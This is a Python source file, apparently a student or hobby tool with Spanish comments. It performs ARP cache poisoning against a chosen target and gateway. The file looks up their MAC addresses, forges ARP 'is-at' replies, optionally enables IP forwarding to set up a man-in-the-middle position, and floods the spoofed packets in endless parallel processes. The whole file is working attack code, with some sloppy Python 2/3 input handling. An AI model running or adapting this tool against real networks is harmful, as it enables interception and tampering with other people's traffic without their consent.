import os
from scapy.all import * 
from multiprocessing import Process

def cambiar_fw(valor):
	f=open("/proc/sys/net/ipv4/ip_forward","w")
	s=str(valor)
	f.write(s)
	f.close()
	

def getMACfromIP(ip):
	#Hacemos ping en segundo plano para poder capturar un paquete icmp del que extraer la direccion MAC asociada a la Ip introducida
	os.system("ping -c 2 " + ip + " &"" > /dev/null 2>&1")
	pcap=sniff(filter="icmp and host " + ip,count=1)
	panalisis=pcap[0]

	if (panalisis[IP].src==ip):
		mac=panalisis[Ether].src
	elif (panalisis[IP].dst==ip):
		mac=panalisis[Ether].dst
	else:
		return 0
	print(ip)
	print(mac)
	return mac

def getmac(interface):

  try:
    mac = open('/sys/class/net/'+interface+'/address').readline()
  except:
    mac = "00:00:00:00:00:00"

  return mac[0:17]

def enviarPaquete(paqueteARP):
	print("Enviando paquetes ARP a " + paqueteARP[ARP].pdst + " con MAC " + paqueteARP[Ether].dst)
	sendp(paqueteARP*2000,inter=1)


def arpPoissoningSoloIP(IP_OBJETIVO,IP_GATEWAY):
	#Obtenemos las direcciones MAC necesarias
	mac_objetivo=getMACfromIP(IP_OBJETIVO)
	mac_gateway=getMACfromIP(IP_GATEWAY)
	mac_propia=getmac("eth0")
	
	os.system("clear")
	print("Envenenando...")
	#Creamos los paquetes que se enviaran para envenenar las tablas ARP
	p1=buildPacket(mac_propia,mac_objetivo,IP_GATEWAY,IP_OBJETIVO)
	p2=buildPacket(mac_propia,mac_gateway,IP_OBJETIVO,IP_GATEWAY)

	#Enviamos los paquetes para envenenar las tablas
	#Creamos 2 procesos para enviar paquetes en paralelo

	enviar=True
	while enviar:
		proceso=Process(target=enviarPaquete, args=(p1,))
		proceso.start()
		proceso2=Process(target=enviarPaquete, args=(p2,))
		proceso2.start()
	

def arpPoissoning(IP_OBJETIVO,IP_GATEWAY,mac_propia,mac_objetivo,mac_gateway):
	#Creamos los paquetes que se enviaran para envenenar las tablas ARP
	p1=buildPacket(mac_propia,mac_objetivo,IP_GATEWAY,IP_OBJETIVO)
	p2=buildPacket(mac_propia,mac_gateway,IP_OBJETIVO,IP_GATEWAY)

	#Enviamos los paquetes para envenenar las tablas
	
	sendp(p1*1000,inter=1)
	sendp(p2*1000,inter=1)


def buildPacket(MAC_PROPIA,MAC_OBJETIVO,IP_GATEWAY,IP_OBJETIVO):
	p=Ether()/ARP()
	p[Ether].dst=MAC_OBJETIVO
	p[Ether].src=MAC_PROPIA
	p[ARP].op="is-at"
	p[ARP].hwsrc=MAC_PROPIA
	p[ARP].psrc=IP_GATEWAY
	p[ARP].hwdst=MAC_OBJETIVO
	p[ARP].pdst=IP_OBJETIVO
	return p

def menuForwarding():
	print("0)Sin Forwarding")
	print("1)Con Forwarding")
	teclado = input()

	if  (teclado == 0):
		cambiar_fw(0)
		print("Desactivando Forwarding")
	elif (teclado == 1):
		cambiar_fw(1)
		print("Activando Forwarding") 

def menu():
	ip_obj=	raw_input("Introduce la IP de objetivo \n")
	ip_gate= raw_input("Introduce la IP del gateway \n")
	arpPoissoningSoloIP(ip_obj,ip_gate)

#No usado
def menuCapa():
	print("0)Capa 2")
	print("1)Capa 3")
	teclado = input()
	salir=False

	if  (teclado == 0):
		ip_obj=	raw_input("Introduce la IP de objetivo:")
		ip_gate= raw_input("Introduce la IP del gateway:")
		arpPoissoningSoloIP(ip_obj,ip_gate)
		
		
	elif (teclado == 1):
		print("Saliendo")
		
	else:
		print("Entrada Incorrecta")



menuForwarding()
menu()


